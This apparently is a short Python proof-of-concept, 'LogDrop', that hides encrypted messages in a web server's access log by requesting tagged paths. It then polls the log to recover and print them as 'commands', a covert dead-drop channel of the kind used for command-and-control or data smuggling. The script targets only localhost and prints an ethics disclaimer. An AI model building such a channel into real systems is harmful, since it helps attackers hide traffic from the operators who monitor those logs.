#!/usr/bin/env python3
#!/usr/bin/env python3
import requests
import hashlib
import base64
from cryptography.fernet import Fernet
import argparse
import re
import time

def parse_access_log_line(line):
    regex = r'(\d+\.\d+\.\d+\.\d+) - - \[([^\]]+)\] "(\w+) ([^ ]+) ([^"]+)" ([\w.]+) -'
    match = re.search(regex, line)
    if match:
        return match.groups()
    else:
        return None

class LogDrop:

    def __init__(self, needle, data=None):
        self.needle = needle
        self.data = data
        self.tag = hashlib.md5(needle.encode()).hexdigest()
        self.key = base64.urlsafe_b64encode(self.tag.ljust(32).encode())
        self.cipher = Fernet(self.key)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext):
        return self.cipher.decrypt(ciphertext.encode()).decode()

    def write(self, access_log_url):
        encoded_data = self.encrypt(self.data)
        url = f"{access_log_url.rsplit('/', 1)[0]}/{self.tag}_{encoded_data}"
        response = requests.get(url, verify=False)
        if response.status_code == 404:
            print(f"Data written with tag: {self.tag} to {url}")
        else:
            print("Failed to write data.")

    def search_and_retrieve(self, access_log_url, last_timestamp=None):
        response = requests.get(access_log_url, verify=False)
        if response.status_code == 200:
            logs = response.text
            lines = logs.split("\n")
            for line in reversed(lines):
                parsed = parse_access_log_line(line)
                if parsed:
                    ip_address, timestamp, http_method, url, http_version, http_status = parsed
                    if last_timestamp and timestamp <= last_timestamp:
                        continue
                    if self.tag in url:
                        _, encoded_data = url.split(f"/{self.tag}_")
                        decoded_data = self.decrypt(encoded_data)
                        print(f"Found and processed command: {decoded_data}")
                        last_timestamp = timestamp
        return last_timestamp

    def monitor(self, access_log_url, interval=5):
        last_timestamp = None
        while True:
            last_timestamp = self.search_and_retrieve(access_log_url, last_timestamp)
            time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LogDrop PoC by Buanzo")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    write_parser = subparsers.add_parser('write', help='Write data to log')
    write_parser.add_argument('needle', help='Needle or tag to use for operation')
    write_parser.add_argument('--data', required=True, help='Data to write')

    search_parser = subparsers.add_parser('search', help='Search data in log')
    search_parser.add_argument('needle', help='Needle or tag to use for operation')

    monitor_parser = subparsers.add_parser('monitor', help='Monitor log for new data')
    monitor_parser.add_argument('needle', help='Needle or tag to use for operation')
    monitor_parser.add_argument('--interval', type=int, default=5, help='Polling interval in seconds')

    args = parser.parse_args()

    logdrop = LogDrop(args.needle, getattr(args, 'data', None))

    print("DISCLAIMER: This PoC does not use the Google search aspect of the technique due to ethical and legal considerations.")
    access_log_url = "http://localhost:8080/logs/access_log"

    if args.mode == "write":
        logdrop.write(access_log_url)
    elif args.mode == "search":
        logdrop.search_and_retrieve(access_log_url)
    elif args.mode == "monitor":
        interval = args.interval
        logdrop.monitor(access_log_url, interval)
